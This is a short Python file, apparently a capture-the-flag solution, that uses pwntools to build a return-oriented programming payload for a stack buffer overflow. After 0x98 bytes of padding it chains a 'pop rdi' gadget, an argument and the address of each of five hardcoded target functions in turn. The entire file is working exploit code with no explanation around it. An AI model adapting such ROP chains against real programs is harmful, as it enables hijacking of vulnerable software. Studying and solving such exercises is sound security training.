from pwn import * 

RDI=0x4020e3

wins = [0x00401950, 0x00401b12, 0x00401cd5, 0x00401a2c, 0x00401bf2]

def get_payload(args, proc: process):
    payload = cyclic(0x98)
    count = 1
    
    for i,addr in enumerate(wins):
        payload += p64(RDI)
        payload += p64(i+1)
        payload += p64(addr)

    return payload

    
